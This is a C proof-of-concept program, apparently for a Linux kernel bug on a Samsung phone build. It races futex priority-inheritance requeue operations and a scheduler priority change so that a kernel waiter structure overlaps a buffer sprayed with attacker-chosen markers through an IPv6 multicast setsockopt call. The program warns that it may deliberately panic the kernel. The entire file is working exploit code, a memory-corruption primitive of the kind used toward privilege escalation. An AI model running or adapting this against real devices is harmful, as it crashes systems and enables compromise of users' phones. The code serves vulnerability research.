#define _GNU_SOURCE

#include <errno.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif

#define STAMP_SIZE 0x108
#ifndef WAITER_OFF
#define WAITER_OFF 0x40
#endif
#define WAITER_SIZE 0x58
#define TASK_OFF 0x30
#define LOCK_OFF 0x38
#define PRIO_OFF 0x44

#define TASK_MARKER 0x4d43415354544153ULL
#define LOCK_MARKER 0x4d434153544c4f43ULL

struct sched_attr_local {
  uint32_t size;
  uint32_t policy;
  uint64_t flags;
  int32_t nice;
  uint32_t priority;
  uint64_t runtime;
  uint64_t deadline;
  uint64_t period;
  uint32_t util_min;
  uint32_t util_max;
};

static uint32_t f_wait;
static uint32_t f_target;
static uint32_t f_chain;

static atomic_int waiter_tid;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_blocking;
static atomic_int requeue_done;
static atomic_int stamp_ready;
static atomic_int stamp_ret;
static atomic_int stamp_errno;

static long futex_call(uint32_t *uaddr, int op, uint32_t val,
                       uintptr_t val2, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, val2, uaddr2, val3);
}

static void spin_until(atomic_int *value) {
  while (!atomic_load_explicit(value, memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");
}

static void spin_forever(void) {
  for (;;)
    __asm__ volatile("yield" ::: "memory");
}

static void pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  if (sched_setaffinity(0, sizeof(set), &set)) {
    perror("sched_setaffinity");
    exit(1);
  }
}

static void build_stamp(uint8_t stamp[STAMP_SIZE]) {
  memset(stamp, 0, STAMP_SIZE);
  uint16_t invalid_family = AF_UNSPEC;
  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
  memset(stamp + WAITER_OFF, 0, WAITER_SIZE);
  uint64_t task = TASK_MARKER;
  uint64_t lock = LOCK_MARKER;
  uint32_t prio = 0;
  memcpy(stamp + WAITER_OFF + TASK_OFF, &task, sizeof(task));
  memcpy(stamp + WAITER_OFF + LOCK_OFF, &lock, sizeof(lock));
  memcpy(stamp + WAITER_OFF + PRIO_OFF, &prio, sizeof(prio));
}

static void *owner_thread(void *unused) {
  (void)unused;
  pin_to_cpu(2);
  if (futex_call(&f_target, FUTEX_LOCK_PI, 0, 0, NULL, 0)) {
    perror("owner FUTEX_LOCK_PI target");
    exit(1);
  }
  spin_until(&waiter_ready);
  atomic_store_explicit(&owner_blocking, 1, memory_order_release);
  futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0);
  spin_forever();
  return NULL;
}

static void *consumer_thread(void *unused) {
  (void)unused;
  pin_to_cpu(3);
  spin_until(&stamp_ready);
  struct sched_attr_local attr = {
      .size = sizeof(attr),
      .policy = SCHED_OTHER,
      .nice = 1,
  };
  syscall(SYS_sched_setattr,
          atomic_load_explicit(&waiter_tid, memory_order_acquire), &attr, 0);
  spin_forever();
  return NULL;
}

static void *waiter_thread(void *unused) {
  (void)unused;
  pin_to_cpu(2);

  int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    perror("socket");
    exit(1);
  }

  uint8_t stamp[STAMP_SIZE];
  build_stamp(stamp);

  int tid = (int)syscall(SYS_gettid);
  atomic_store_explicit(&waiter_tid, tid, memory_order_release);

  if (futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0)) {
    perror("waiter FUTEX_LOCK_PI chain");
    exit(1);
  }
  atomic_store_explicit(&waiter_ready, 1, memory_order_release);
  spin_until(&owner_blocking);

  struct timespec timeout;
  if (clock_gettime(CLOCK_MONOTONIC, &timeout)) {
    perror("clock_gettime");
    exit(1);
  }
  timeout.tv_sec += 1;

  atomic_store_explicit(&waiter_waiting, 1, memory_order_release);
  futex_call(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, (uintptr_t)&timeout,
             &f_target, 0);
  spin_until(&requeue_done);

  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, stamp,
                       sizeof(stamp));
  int error = errno;
  atomic_store_explicit(&stamp_ret, ret, memory_order_relaxed);
  atomic_store_explicit(&stamp_errno, error, memory_order_relaxed);
  atomic_store_explicit(&stamp_ready, 1, memory_order_release);
  spin_forever();
  return NULL;
}

static int probe_mcast_path(void) {
  int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    perror("socket");
    return 1;
  }
  uint8_t stamp[STAMP_SIZE];
  build_stamp(stamp);
  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, stamp,
                       sizeof(stamp));
  int error = errno;
  close(fd);
  printf("probe setsockopt ret=%d errno=%d\n", ret, error);
  return ret == -1 ? 0 : 1;
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  if (argc != 2 ||
      (strcmp(argv[1], "--probe") && strcmp(argv[1], "--trigger"))) {
    fprintf(stderr, "usage: %s --probe|--trigger\n", argv[0]);
    return 2;
  }
  if (!strcmp(argv[1], "--probe"))
    return probe_mcast_path();

  printf("S918B/FZF5 native MCAST waiter-overlap test\n");
  printf("Expected waiter offset: buffer+0x%x\n", WAITER_OFF);
  printf("Expected panic gate: x27=%016llx\n",
         (unsigned long long)LOCK_MARKER);
  printf("This test may intentionally panic the kernel.\n");

  pthread_t owner;
  pthread_t waiter;
  pthread_t consumer;
  if (pthread_create(&owner, NULL, owner_thread, NULL) ||
      pthread_create(&consumer, NULL, consumer_thread, NULL) ||
      pthread_create(&waiter, NULL, waiter_thread, NULL)) {
    perror("pthread_create");
    return 1;
  }

  spin_until(&waiter_waiting);
  spin_until(&owner_blocking);
  struct timespec settle = {.tv_nsec = 20000000};
  if (nanosleep(&settle, NULL)) {
    perror("nanosleep");
    return 1;
  }

  errno = 0;
  long ret = futex_call(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, 1, &f_target, 0);
  int error = errno;
  atomic_store_explicit(&requeue_done, 1, memory_order_release);
  printf("requeue ret=%ld errno=%d; waiting for native stamp\n", ret, error);

  spin_until(&stamp_ready);
  printf("setsockopt ret=%d errno=%d; consumer released\n",
         atomic_load_explicit(&stamp_ret, memory_order_relaxed),
         atomic_load_explicit(&stamp_errno, memory_order_relaxed));

  pthread_join(waiter, NULL);
  return 0;
}
